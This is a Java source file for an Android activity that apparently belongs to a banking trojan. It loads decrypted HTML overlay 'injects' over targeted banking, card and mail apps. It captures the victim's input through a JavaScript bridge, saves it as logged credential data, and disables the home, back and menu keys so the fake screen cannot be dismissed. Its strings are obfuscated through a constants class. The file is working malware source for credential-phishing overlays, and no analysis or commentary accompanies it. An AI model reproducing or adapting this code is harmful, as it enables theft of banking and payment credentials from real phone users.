package com.example.mmm.Activity;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Locale;

import static java.lang.System.exit;

public class actViewInjection extends Activity {
    constants consts = new constants();
    utils utl = new utils();
    private String TAG_LOG  = actViewInjection.class.getSimpleName()+ consts.strTAG1;
    private String mApplication = consts.str_null;
    private String nameInj = consts.str_null;
    private String idInject = consts.str_null;
    private String settingsApp = consts.str_null;
    private String open = consts.str_null;
    private boolean stopActivity;


    private boolean hideStop = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        open = "new";
        mApplication = utl.SettingsRead(this, "app_inject");
        nameInj = utl.SettingsRead(this, "nameInject");
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        if(!utl.SettingsRead(this,"app_inject").contains(mApplication)) {open = "new";}else {open = "old"; }
    }

    @Override
    protected void onStart() {
        super.onStart();

        mApplication = utl.SettingsRead(this, "app_inject");
        nameInj = utl.SettingsRead(this, "nameInject");
        hideStop = true;

        if((!stopActivity) && (open.equals("new"))) {
                utl.Log(TAG_LOG,"LOADING INJECT++++++++" + open);

            try {
                if (getIntent().getStringExtra(consts.string_139).equals(consts.str_1)) {
                    String startpush  = utl.SettingsRead(this, consts.string_138);
                    if(!startpush.isEmpty()){
                        mApplication = startpush;
                        nameInj = utl.SettingsRead(this, "nameInject");
                        utl.SettingsWrite(this, consts.string_138, "");
                    }
                }
            }catch (Exception ex){}

            try {
                if (!mApplication.isEmpty()) {
                    WebView wv = new WebView(this);
                    wv.getSettings().setJavaScriptEnabled(true);
                    wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
                    wv.setWebViewClient(new actViewInjection.MyWebViewClient());
                    wv.setWebChromeClient(new actViewInjection.MyWebChromeClient());
                    wv.addJavascriptInterface(new WebAppInterface(this), consts.string_1);
                    String getHTML;
                    String lang = Locale.getDefault().getLanguage();
                    if ((nameInj.equals(consts.string_8)) || (nameInj.equals(consts.string_9))) {
                        getHTML = utl.trafDeCr(utl.SettingsRead(this, nameInj));

                        getHTML = getHTML.replace(consts.string_10, consts.string_11 + lang + consts.string_5);
                        getHTML = getHTML.replace(consts.string_12, consts.string_13+ mApplication + consts.string_14);
                    } else {
                        getHTML = utl.trafDeCr(utl.SettingsRead(this, mApplication));
                    }

                    if(nameInj.equals(consts.string_8)){
                        //getHTML = getHTML.replace("<html lang=\"en\">", "<html lang=\""+ lang +"\">");
                        getHTML = getHTML.replace(consts.string_142, consts.string_143 + Locale.getDefault().getLanguage() + consts.string_144);
                    }

                    //  wv.loadData(getHTML, consts.string_2, consts.strUTF_8);
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_146 + mApplication  + consts.string_119);
                    wv.loadDataWithBaseURL(null,getHTML, consts.string_2, consts.strUTF_8, null);
                    setContentView(wv);
                }
                utl.Log(TAG_LOG, consts.string_15 + mApplication);
            } catch (Exception ex) {
                utl.Log(TAG_LOG, consts.string_16 + mApplication);
               // utl.SettingsToAdd(this, consts.LogSMS , consts.string_147 + ex.toString() + consts.string_119);
            }
        }
    }


    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }
        @JavascriptInterface
        public void returnResult(String data) {
            if(!data.isEmpty()) {

                if(idInject.isEmpty()){idInject = utl.randomString(20);}
                JSONObject jsonObject = new JSONObject();

                try {
                    jsonObject.put(consts.string_18,mApplication+nameInj);
                    jsonObject.put(consts.string_19, data.replace(consts.string_20, consts.str_null));
                } catch (JSONException e) {}

                if(nameInj.equals(consts.str_null)){
                    utl.SettingsWrite(mContext, consts.statBanks, consts.str_1);
                    settingsApp = mApplication;
                }else if(nameInj.equals(consts.string_8)){
                    utl.SettingsWrite(mContext, consts.statCards, consts.str_1);
                    settingsApp = nameInj;
                }else if(nameInj.equals(consts.string_9)){
                    utl.SettingsWrite(mContext, consts.statMails, consts.str_1);
                    settingsApp = nameInj;
                }

                utl.Log(TAG_LOG, consts.string_21 + idInject + consts.string_22 +  jsonObject.toString());
                utl.SettingsToAddJson(mContext, idInject, jsonObject.toString());

                if(!utl.SettingsRead(mContext, consts.listSaveLogsInjection).contains(idInject)){ //add list save injection
                    utl.SettingsToAdd(mContext, consts.listSaveLogsInjection, idInject + consts.string_23);
                }
                utl.SettingsRemove(mContext, consts.actionSettingInection, settingsApp);//Detele action injection!


                if(!nameInj.isEmpty()){
                    stopActivity=true;
                    finish();
                }else if(data.contains(consts.string_20) || data.contains(consts.string_20_)){
                    stopActivity=true;
                    finish();
                }


            }
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished (WebView view, String url){
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }
    }

    private class MyWebChromeClient extends WebChromeClient {

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
            return true;
        }
    }

    @Override
    protected void onStop() {
        utl.Log("INJ","onStop!");
        super.onStop();


        hideStop=false;

        new Thread(new Runnable() {
            public void run() {
                for(int i=0;i<=2;i++){
                    utl.chalkTile(1000);
                    utl.Log("HideInject", "i = " + i);
                    if(hideStop){
                        break;
                    }

                    if(i>=2){
                        try {
                            stopActivity=true;
                            finish();
                            break;
                        }catch (Exception ex){}
                    }
                }
            }
        }).start();
    }


    @Override
    public void onPause(){
        super.onPause();

    }
    @Override
    public void onDestroy(){
        super.onDestroy();
        utl.SettingsWrite(this, "old_start_inj", "0");

    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
}
